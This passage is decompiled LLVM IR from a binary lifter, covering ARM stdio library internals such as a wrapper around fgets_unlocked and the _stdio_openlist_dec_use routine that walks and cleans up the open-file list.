  %v0_16ae4 = phi i32 [ %arg3, %entry ], [ %v0_16ae4.pre, %dec_label_pc_16ad0 ]
  %v0_16ae0 = phi i32 [ %arg2, %entry ], [ %v0_16ae0.pre, %dec_label_pc_16ad0 ]
  %v0_16adc = phi i32 [ %arg1, %entry ], [ %v0_16adc.pre, %dec_label_pc_16ad0 ]
  store i32 %v0_16ae0, i32* %r1.global-to-local, align 4
  store i32 %v0_16ae4, i32* %r2.global-to-local, align 4
  %v3_16ae8 = inttoptr i32 %v0_16adc to i8*
  %v4_16ae8 = call i32 @__GI_fgets_unlocked(i8* %v3_16ae8, i32 %v0_16ae0, i32 %v0_16ae4)
  %v0_16aec = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16aec = icmp eq i32 %v0_16aec, 0
  store i32 %v4_16ae8, i32* %r8.global-to-local, align 4
  br i1 %v2_16aec, label %dec_label_pc_16af8, label %dec_label_pc_16b6c

dec_label_pc_16af8:                               ; preds = %dec_label_pc_16adc
  %v0_16af8 = load i32, i32* @r7, align 4
  %v1_16af8 = add i32 %v0_16af8, 60
  %v2_16af8 = inttoptr i32 %v1_16af8 to i32*
  %v3_16af8 = load i32, i32* %v2_16af8, align 4
  %v1_16afc = add i32 %v3_16af8, -1
  store i32 %v1_16afc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16b00 = icmp eq i32 %v1_16afc, 0
  store i32 %v1_16afc, i32* %v2_16af8, align 4
  br i1 %v2_16b00, label %dec_label_pc_16b0c, label %dec_label_pc_16b6c

dec_label_pc_16b0c:                               ; preds = %dec_label_pc_16af8
  %v0_16b0c = load i32, i32* %r3.global-to-local, align 4
  %v1_16b0c = load i32, i32* @r7, align 4
  %v2_16b0c = add i32 %v1_16b0c, 64
  %v3_16b0c = inttoptr i32 %v2_16b0c to i32*
  store i32 %v0_16b0c, i32* %v3_16b0c, align 4
  %v0_16b10 = load i32, i32* @r7, align 4
  %v1_16b10 = add i32 %v0_16b10, 56
  store i32 %v1_16b10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16b14

dec_label_pc_16b14:                               ; preds = %dec_label_pc_16b44.dec_label_pc_16b14_crit_edge, %dec_label_pc_16b0c
  %v0_16b1c = phi i32 [ %v0_16b1c.pre, %dec_label_pc_16b44.dec_label_pc_16b14_crit_edge ], [ %v1_16b10, %dec_label_pc_16b0c ]
  %v0_16b14 = phi i32 [ %v0_16b14.pre, %dec_label_pc_16b44.dec_label_pc_16b14_crit_edge ], [ %v0_16b10, %dec_label_pc_16b0c ]
  %v1_16b14 = add i32 %v0_16b14, 56
  %v2_16b14 = inttoptr i32 %v1_16b14 to i32*
  %v3_16b14 = load i32, i32* %v2_16b14, align 4
  store i32 %v3_16b14, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16b1c, i32* %r2.global-to-local, align 4
  %v1_16b2024 = inttoptr i32 %v0_16b1c to i32*
  %v2_16b2025 = load i32, i32* %v1_16b2024, align 4
  store i32 %v2_16b2025, i32* %r3.global-to-local, align 4
  %v3_16b2427 = icmp uge i32 %v2_16b2025, %v3_16b14
  store i1 %v3_16b2427, i1* %cpsr_c.global-to-local, align 1
  %v9_16b2433 = icmp eq i32 %v2_16b2025, %v3_16b14
  br i1 %v9_16b2433, label %dec_label_pc_16b2c, label %dec_label_pc_16b44

dec_label_pc_16b2c:                               ; preds = %dec_label_pc_16b14, %dec_label_pc_16b2c.dec_label_pc_16b20_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16b3c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16b3c, label %dec_label_pc_16b40, label %dec_label_pc_16b2c.dec_label_pc_16b20_crit_edge

dec_label_pc_16b2c.dec_label_pc_16b20_crit_edge:  ; preds = %dec_label_pc_16b2c
  %v0_16b20.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16b24.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16b20 = inttoptr i32 %v0_16b20.pre to i32*
  %v2_16b20 = load i32, i32* %v1_16b20, align 4
  store i32 %v2_16b20, i32* %r3.global-to-local, align 4
  %v3_16b24 = icmp uge i32 %v2_16b20, %v1_16b24.pre
  store i1 %v3_16b24, i1* %cpsr_c.global-to-local, align 1
  %v9_16b24 = icmp eq i32 %v2_16b20, %v1_16b24.pre
  br i1 %v9_16b24, label %dec_label_pc_16b2c, label %dec_label_pc_16b44

dec_label_pc_16b40:                               ; preds = %dec_label_pc_16b2c
  %v0_16b40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16b40, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b44

dec_label_pc_16b44:                               ; preds = %dec_label_pc_16b14, %dec_label_pc_16b2c.dec_label_pc_16b20_crit_edge, %dec_label_pc_16b40
  %v0_16b4c = phi i32 [ %v0_16b40, %dec_label_pc_16b40 ], [ %v2_16b2025, %dec_label_pc_16b14 ], [ %v2_16b20, %dec_label_pc_16b2c.dec_label_pc_16b20_crit_edge ]
  %v1_16b44 = phi i32 [ %v0_16b40, %dec_label_pc_16b40 ], [ %v3_16b14, %dec_label_pc_16b14 ], [ %v1_16b24.pre, %dec_label_pc_16b2c.dec_label_pc_16b20_crit_edge ]
  %v3_16b44 = icmp uge i32 %v0_16b4c, %v1_16b44
  store i1 %v3_16b44, i1* %cpsr_c.global-to-local, align 1
  %v9_16b44 = icmp eq i32 %v0_16b4c, %v1_16b44
  br i1 %v9_16b44, label %dec_label_pc_16b4c, label %dec_label_pc_16b44.dec_label_pc_16b14_crit_edge

dec_label_pc_16b44.dec_label_pc_16b14_crit_edge:  ; preds = %dec_label_pc_16b44
  %v0_16b14.pre = load i32, i32* @r7, align 4
  %v0_16b1c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16b14

dec_label_pc_16b4c:                               ; preds = %dec_label_pc_16b44
  %v2_16b4c = icmp ne i32 %v1_16b44, 0
  store i1 %v2_16b4c, i1* %cpsr_c.global-to-local, align 1
  %v7_16b50 = icmp slt i32 %v1_16b44, 2
  br i1 %v7_16b50, label %dec_label_pc_16b6c, label %dec_label_pc_16b54

dec_label_pc_16b54:                               ; preds = %dec_label_pc_16b4c
  %v0_16b58 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b58 = add i32 %v0_16b58, 129
  store i32 %v1_16b58, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b6c

dec_label_pc_16b6c:                               ; preds = %dec_label_pc_16af8, %dec_label_pc_16adc, %dec_label_pc_16b54, %dec_label_pc_16b4c
  %v0_16b6c = load i32, i32* %r8.global-to-local, align 4
  %v2_16b70 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16b70, i32* %r4.global-to-local, align 4
  store i32 %v6_16a5c, i32* @r5, align 4
  store i32 %v9_16a5c, i32* @r6, align 4
  store i32 %v12_16a5c, i32* @r7, align 4
  store i32 %v15_16a5c, i32* @r8, align 4
  store i32 %v24_16a5c, i32* @lr, align 4
  ret i32 %v0_16b6c

; uselistorder directives
  uselistorder i32 %v0_16b40, { 1, 0, 2 }
  uselistorder i32 %v1_16b24.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16ae0, { 1, 0 }
  uselistorder i32 %v0_16ae4, { 1, 0 }
  uselistorder i32 %v1_16aa0.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 12, 4, 5, 6, 7, 9, 8, 11, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 9, 10, 7, 8 }
  uselistorder i32 %arg3, { 0, 3, 1, 4, 2, 5 }
  uselistorder label %dec_label_pc_16b6c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16b44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b2c, { 1, 0 }
  uselistorder label %dec_label_pc_16adc, { 1, 0 }
  uselistorder label %dec_label_pc_16ad0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_16ac0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16aa8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16b78 = load i32, i32* @r4, align 4
  store i32 %v3_16b78, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r5.global-to-local, align 4
  %v4_16b88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 160) to i32*), align 4
  store i32 %v4_16b88, i32* %r7.global-to-local, align 4
  %v0_16b8c = call i32 @__aeabi_read_tp()
  store i32 %v0_16b8c, i32* %r0.global-to-local, align 4
  %v1_16b90 = add i32 %v4_16b88, 8
  %v2_16b90 = inttoptr i32 %v1_16b90 to i32*
  %v3_16b90 = load i32, i32* %v2_16b90, align 4
  store i32 %v3_16b90, i32* %r3.global-to-local, align 4
  %v1_16b94 = add i32 %v0_16b8c, -1168
  store i32 %v1_16b94, i32* %r6.global-to-local, align 4
  %v3_16b98 = icmp uge i32 %v3_16b90, %v1_16b94
  store i1 %v3_16b98, i1* %cpsr_c.global-to-local, align 1
  %v9_16b98 = icmp eq i32 %v3_16b90, %v1_16b94
  br i1 %v9_16b98, label %dec_label_pc_16be4, label %dec_label_pc_16ba4

dec_label_pc_16ba4:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16b88, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16bb093 = inttoptr i32 %v4_16b88 to i32*
  %v2_16bb094 = load i32, i32* %v1_16bb093, align 4
  store i32 %v2_16bb094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16bb496 = icmp eq i32 %v2_16bb094, 0
  br i1 %v9_16bb496, label %dec_label_pc_16bbc, label %dec_label_pc_16bd4

dec_label_pc_16bbc:                               ; preds = %dec_label_pc_16ba4, %dec_label_pc_16bbc.dec_label_pc_16bb0_crit_edge
  %v0_16bbc97 = phi i32 [ %v1_16bb4.pre, %dec_label_pc_16bbc.dec_label_pc_16bb0_crit_edge ], [ 0, %dec_label_pc_16ba4 ]
  store i32 %v0_16bbc97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16bcc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16bcc, label %dec_label_pc_16bd0, label %dec_label_pc_16bbc.dec_label_pc_16bb0_crit_edge

dec_label_pc_16bbc.dec_label_pc_16bb0_crit_edge:  ; preds = %dec_label_pc_16bbc
  %v0_16bb0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16bb4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16bb0 = inttoptr i32 %v0_16bb0.pre to i32*
  %v2_16bb0 = load i32, i32* %v1_16bb0, align 4
  store i32 %v2_16bb0, i32* %r3.global-to-local, align 4
  %v3_16bb4 = icmp uge i32 %v2_16bb0, %v1_16bb4.pre
  store i1 %v3_16bb4, i1* %cpsr_c.global-to-local, align 1
  %v9_16bb4 = icmp eq i32 %v2_16bb0, %v1_16bb4.pre
  br i1 %v9_16bb4, label %dec_label_pc_16bbc, label %dec_label_pc_16bd4

dec_label_pc_16bd0:                               ; preds = %dec_label_pc_16bbc
  %v0_16bd0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16bd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16bd4

dec_label_pc_16bd4:                               ; preds = %dec_label_pc_16ba4, %dec_label_pc_16bbc.dec_label_pc_16bb0_crit_edge, %dec_label_pc_16bd0
  %v0_16bd4 = phi i32 [ %v0_16bd0, %dec_label_pc_16bd0 ], [ %v2_16bb094, %dec_label_pc_16ba4 ], [ %v2_16bb0, %dec_label_pc_16bbc.dec_label_pc_16bb0_crit_edge ]
  %v1_16bd4 = phi i32 [ %v0_16bd0, %dec_label_pc_16bd0 ], [ 0, %dec_label_pc_16ba4 ], [ %v1_16bb4.pre, %dec_label_pc_16bbc.dec_label_pc_16bb0_crit_edge ]
  %v3_16bd4 = icmp uge i32 %v0_16bd4, %v1_16bd4
  store i1 %v3_16bd4, i1* %cpsr_c.global-to-local, align 1
  %v9_16bd4 = icmp eq i32 %v0_16bd4, %v1_16bd4
  br i1 %v9_16bd4, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_16bd4
  %v1_16bd8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16bd8, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16bd4, %bb
  %v1_16bdc = xor i1 %v9_16bd4, true
  call void @__pseudo_cond_branch(i1 %v1_16bdc, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_16be0 = load i32, i32* %r6.global-to-local, align 4
  %v1_16be0 = load i32, i32* %r7.global-to-local, align 4
  %v2_16be0 = add i32 %v1_16be0, 8
  %v3_16be0 = inttoptr i32 %v2_16be0 to i32*
  store i32 %v0_16be0, i32* %v3_16be0, align 4
  br label %dec_label_pc_16be4

dec_label_pc_16be4:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16be8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16be8 = add i32 %v0_16be8, 160
  %v3_16be8 = inttoptr i32 %v2_16be8 to i32*
  %v4_16be8 = load i32, i32* %v3_16be8, align 4
  store i32 %v4_16be8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16bf0 = add i32 %v0_16be8, 12
  %v3_16bf0 = inttoptr i32 %v2_16bf0 to i32*
  %v4_16bf0 = load i32, i32* %v3_16bf0, align 4
  store i32 %v4_16bf0, i32* %r3.global-to-local, align 4
  %v1_16bf4 = inttoptr i32 %v4_16bf0 to i32*
  %v2_16bf4 = load i32, i32* %v1_16bf4, align 4
  store i32 %v2_16bf4, i32* %r1.global-to-local, align 4
  %v1_16bf8 = add i32 %v4_16be8, 4
  %v2_16bf8 = inttoptr i32 %v1_16bf8 to i32*
  %v3_16bf8 = load i32, i32* %v2_16bf8, align 4
  %v2_16bfc = icmp ne i32 %v2_16bf4, 0
  store i1 %v2_16bfc, i1* %cpsr_c.global-to-local, align 1
  %v7_16bfc = icmp eq i32 %v2_16bf4, 1
  %v1_16c00 = add i32 %v3_16bf8, 1
  store i32 %v1_16c00, i32* %r3.global-to-local, align 4
  store i32 %v1_16c00, i32* %v2_16bf8, align 4
  br i1 %v7_16bfc, label %dec_label_pc_16c0c, label %dec_label_pc_16d70

dec_label_pc_16c0c:                               ; preds = %dec_label_pc_16be4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16c10 = load i32, i32* %r5.global-to-local, align 4
  %v2_16c10 = add i32 %v0_16c10, 80
  %v3_16c10 = inttoptr i32 %v2_16c10 to i32*
  %v4_16c10 = load i32, i32* %v3_16c10, align 4
  store i32 %v4_16c10, i32* %r3.global-to-local, align 4
  %v1_16c14 = inttoptr i32 %v4_16c10 to i32*
  %v2_16c14 = load i32, i32* %v1_16c14, align 4
  store i32 %v2_16c14, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_16c14, 1
  br i1 %tmp46, label %dec_label_pc_16d70, label %dec_label_pc_16c20

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16c0c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16c24 = add i32 %v0_16c10, 152
  %v3_16c24 = inttoptr i32 %v2_16c24 to i32*
  %v4_16c24 = load i32, i32* %v3_16c24, align 4
  store i32 %v4_16c24, i32* %r7.global-to-local, align 4
  %v1_16c28 = add i32 %v4_16c24, 8
  %v2_16c28 = inttoptr i32 %v1_16c28 to i32*
  %v3_16c28 = load i32, i32* %v2_16c28, align 4
  store i32 %v3_16c28, i32* %r3.global-to-local, align 4
  %v1_16c2c = load i32, i32* %r6.global-to-local, align 4
  %v3_16c2c = icmp uge i32 %v3_16c28, %v1_16c2c
  store i1 %v3_16c2c, i1* %cpsr_c.global-to-local, align 1
  %v9_16c2c = icmp eq i32 %v3_16c28, %v1_16c2c
  br i1 %v9_16c2c, label %dec_label_pc_16c70, label %dec_label_pc_16c34

dec_label_pc_16c34:                               ; preds = %dec_label_pc_16c20
  store i32 %v4_16c24, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16c3c86 = inttoptr i32 %v4_16c24 to i32*
  %v2_16c3c87 = load i32, i32* %v1_16c3c86, align 4
  store i32 %v2_16c3c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16c4089 = icmp eq i32 %v2_16c3c87, 0
  br i1 %v9_16c4089, label %dec_label_pc_16c48, label %dec_label_pc_16c60

dec_label_pc_16c48:                               ; preds = %dec_label_pc_16c34, %dec_label_pc_16c48.dec_label_pc_16c3c_crit_edge
  %v0_16c4890 = phi i32 [ %v1_16c40.pre, %dec_label_pc_16c48.dec_label_pc_16c3c_crit_edge ], [ 0, %dec_label_pc_16c34 ]
  store i32 %v0_16c4890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16c58 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16c58, label %dec_label_pc_16c5c, label %dec_label_pc_16c48.dec_label_pc_16c3c_crit_edge

dec_label_pc_16c48.dec_label_pc_16c3c_crit_edge:  ; preds = %dec_label_pc_16c48
  %v0_16c3c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16c40.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16c3c = inttoptr i32 %v0_16c3c.pre to i32*
  %v2_16c3c = load i32, i32* %v1_16c3c, align 4
  store i32 %v2_16c3c, i32* %r3.global-to-local, align 4
  %v3_16c40 = icmp uge i32 %v2_16c3c, %v1_16c40.pre
  store i1 %v3_16c40, i1* %cpsr_c.global-to-local, align 1
  %v9_16c40 = icmp eq i32 %v2_16c3c, %v1_16c40.pre
  br i1 %v9_16c40, label %dec_label_pc_16c48, label %dec_label_pc_16c60

dec_label_pc_16c5c:                               ; preds = %dec_label_pc_16c48
  %v0_16c5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16c5c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c60

dec_label_pc_16c60:                               ; preds = %dec_label_pc_16c34, %dec_label_pc_16c48.dec_label_pc_16c3c_crit_edge, %dec_label_pc_16c5c
  %v0_16c60 = phi i32 [ %v0_16c5c, %dec_label_pc_16c5c ], [ %v2_16c3c87, %dec_label_pc_16c34 ], [ %v2_16c3c, %dec_label_pc_16c48.dec_label_pc_16c3c_crit_edge ]
  %v1_16c60 = phi i32 [ %v0_16c5c, %dec_label_pc_16c5c ], [ 0, %dec_label_pc_16c34 ], [ %v1_16c40.pre, %dec_label_pc_16c48.dec_label_pc_16c3c_crit_edge ]
  %v3_16c60 = icmp uge i32 %v0_16c60, %v1_16c60
  store i1 %v3_16c60, i1* %cpsr_c.global-to-local, align 1
  %v9_16c60 = icmp eq i32 %v0_16c60, %v1_16c60
  br i1 %v9_16c60, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_16c60
  %v1_16c64 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16c64, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_16c60, %bb47
  %v1_16c68 = xor i1 %v9_16c60, true
  call void @__pseudo_cond_branch(i1 %v1_16c68, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_16c6c = load i32, i32* %r6.global-to-local, align 4
  %v1_16c6c = load i32, i32* %r7.global-to-local, align 4
  %v2_16c6c = add i32 %v1_16c6c, 8
  %v3_16c6c = inttoptr i32 %v2_16c6c to i32*
  store i32 %v0_16c6c, i32* %v3_16c6c, align 4
  %v0_16c78.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16c70

dec_label_pc_16c70:                               ; preds = %dec_label_pc_16c20, %bb48
  %v0_16c78 = phi i32 [ %v0_16c10, %dec_label_pc_16c20 ], [ %v0_16c78.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_16c78 = add i32 %v0_16c78, 152
  %v3_16c78 = inttoptr i32 %v2_16c78 to i32*
  %v4_16c78 = load i32, i32* %v3_16c78, align 4
  store i32 %v4_16c78, i32* %r0.global-to-local, align 4
  %v2_16c7c = add i32 %v0_16c78, 76
  %v3_16c7c = inttoptr i32 %v2_16c7c to i32*
  %v4_16c7c = load i32, i32* %v3_16c7c, align 4
  store i32 %v4_16c7c, i32* %r2.global-to-local, align 4
  %v1_16c80 = add i32 %v4_16c78, 4
  %v2_16c80 = inttoptr i32 %v1_16c80 to i32*
  %v3_16c80 = load i32, i32* %v2_16c80, align 4
  store i32 %v3_16c80, i32* %r3.global-to-local, align 4
  %v1_16c84 = inttoptr i32 %v4_16c7c to i32*
  %v2_16c84 = load i32, i32* %v1_16c84, align 4
  store i32 %v2_16c84, i32* %r2.global-to-local, align 4
  %v1_16c88 = add i32 %v3_16c80, 1
  store i32 %v1_16c88, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_16c88, i32* %v2_16c80, align 4
  %v0_16cd8.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16cd811 = icmp eq i32 %v0_16cd8.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16cd811, label %dec_label_pc_16ce4, label %dec_label_pc_16c9c

dec_label_pc_16c9c:                               ; preds = %dec_label_pc_16c70, %dec_label_pc_16cd4
  %v0_16cc02 = phi i32 [ %v0_16cd4, %dec_label_pc_16cd4 ], [ %v0_16cd8.pr, %dec_label_pc_16c70 ]
  %v1_16c9c = inttoptr i32 %v0_16cc02 to i16*
  %v2_16c9c = load i16, i16* %v1_16c9c, align 2
  %v3_16c9c = zext i16 %v2_16c9c to i32
  store i32 %v3_16c9c, i32* %r3.global-to-local, align 4
  %v2_16ca0 = and i32 %v3_16c9c, 32816
  store i32 %v2_16ca0, i32* %r1.global-to-local, align 4
  %v2_16ca4 = icmp ugt i32 %v2_16ca0, 47
  store i1 %v2_16ca4, i1* %cpsr_c.global-to-local, align 1
  %v7_16ca4 = icmp eq i32 %v2_16ca0, 48
  %v1_16ca8 = add i32 %v0_16cc02, 32
  %v2_16ca8 = inttoptr i32 %v1_16ca8 to i32*
  %v3_16ca8 = load i32, i32* %v2_16ca8, align 4
  store i32 %v3_16ca8, i32* %r4.global-to-local, align 4
  br i1 %v7_16ca4, label %dec_label_pc_16cb4, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_16c9c
  store i32 %v0_16cc02, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16cd4

dec_label_pc_16cb4:                               ; preds = %dec_label_pc_16c9c
  %v0_16cb4 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16cb4 = icmp eq i32 %v0_16cb4, 0
  br i1 %v2_16cb4, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_16cb4
  %v1_16cb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16cb8 = load i32, i32* %r7.global-to-local, align 4
  %v3_16cb8 = add i32 %v2_16cb8, %v1_16cb8
  %v4_16cb8 = inttoptr i32 %v3_16cb8 to i32*
  %v5_16cb8 = load i32, i32* %v4_16cb8, align 4
  store i32 %v5_16cb8, i32* %r3.global-to-local, align 4
  %v3_16cbc = inttoptr i32 %v5_16cb8 to i32*
  store i32 %v3_16ca8, i32* %v3_16cbc, align 4
  %v0_16cc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16cc0 = inttoptr i32 %v0_16cc0 to i16*
  %v2_16cc0 = load i16, i16* %v1_16cc0, align 2
  %v3_16cc0 = zext i16 %v2_16cc0 to i32
  store i32 %v3_16cc0, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_16cb4
  %v2_16cc08 = load i16, i16* %v1_16c9c, align 2
  %v3_16cc09 = zext i16 %v2_16cc08 to i32
  store i32 %v3_16cc09, i32* %r3.global-to-local, align 4
  %v3_16cc4 = add i32 %v0_16cb4, 32
  %v4_16cc4 = inttoptr i32 %v3_16cc4 to i32*
  store i32 %v3_16ca8, i32* %v4_16cc4, align 4
  %v0_16cc8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_16cc8 = phi i32 [ %v3_16cc0, %.thread ], [ %v0_16cc8.pre, %bb49 ]
  %v1_16cc8 = and i32 %v0_16cc8, 8192
  %v2_16cc8 = icmp eq i32 %v1_16cc8, 0
  br i1 %v2_16cc8, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_16ccc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_16ccc, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_16cd0 = xor i1 %v2_16cc8, true
  call void @__pseudo_cond_branch(i1 %v1_16cd0, i32 ptrtoint (i32* @global_var_135cc.33 to i32))
  %v0_16cd4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16cd4

dec_label_pc_16cd4:                               ; preds = %.thread38, %bb52
  %v0_16cd4 = phi i32 [ %v0_16cd4.pre, %bb52 ], [ %v3_16ca8, %.thread38 ]
  store i32 %v0_16cd4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16cd8 = icmp eq i32 %v0_16cd4, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16cd8, label %dec_label_pc_16ce4, label %dec_label_pc_16c9c

dec_label_pc_16ce4:                               ; preds = %dec_label_pc_16cd4, %dec_label_pc_16c70
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16ce8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16ce8 = add i32 %v0_16ce8, 152
  %v3_16ce8 = inttoptr i32 %v2_16ce8 to i32*
  %v4_16ce8 = load i32, i32* %v3_16ce8, align 4
  store i32 %v4_16ce8, i32* %r0.global-to-local, align 4
  %v1_16cec = add i32 %v4_16ce8, 4
  %v2_16cec = inttoptr i32 %v1_16cec to i32*
  %v3_16cec = load i32, i32* %v2_16cec, align 4
  %v1_16cf0 = add i32 %v3_16cec, -1
  store i32 %v1_16cf0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16cf4 = icmp eq i32 %v1_16cf0, 0
  store i32 %v1_16cf0, i32* %v2_16cec, align 4
  br i1 %v2_16cf4, label %dec_label_pc_16d00, label %dec_label_pc_16d60

dec_label_pc_16d00:                               ; preds = %dec_label_pc_16ce4
  %v0_16d00 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d00 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d00 = add i32 %v1_16d00, 8
  %v3_16d00 = inttoptr i32 %v2_16d00 to i32*
  store i32 %v0_16d00, i32* %v3_16d00, align 4
  %v0_16d04 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16d04, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d08

dec_label_pc_16d08:                               ; preds = %dec_label_pc_16d38.dec_label_pc_16d08_crit_edge, %dec_label_pc_16d00
  %v0_16d08 = phi i32 [ %v0_16d08.pre, %dec_label_pc_16d38.dec_label_pc_16d08_crit_edge ], [ %v0_16d04, %dec_label_pc_16d00 ]
  %v1_16d08 = inttoptr i32 %v0_16d08 to i32*
  %v2_16d08 = load i32, i32* %v1_16d08, align 4
  store i32 %v2_16d08, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16d08, i32* %r2.global-to-local, align 4
  %v2_16d1474 = load i32, i32* %v1_16d08, align 4
  store i32 %v2_16d1474, i32* %r3.global-to-local, align 4
  %v3_16d1876 = icmp uge i32 %v2_16d1474, %v2_16d08
  store i1 %v3_16d1876, i1* %cpsr_c.global-to-local, align 1
  %v9_16d1882 = icmp eq i32 %v2_16d1474, %v2_16d08
  br i1 %v9_16d1882, label %dec_label_pc_16d20, label %dec_label_pc_16d38

dec_label_pc_16d20:                               ; preds = %dec_label_pc_16d08, %dec_label_pc_16d20.dec_label_pc_16d14_crit_edge
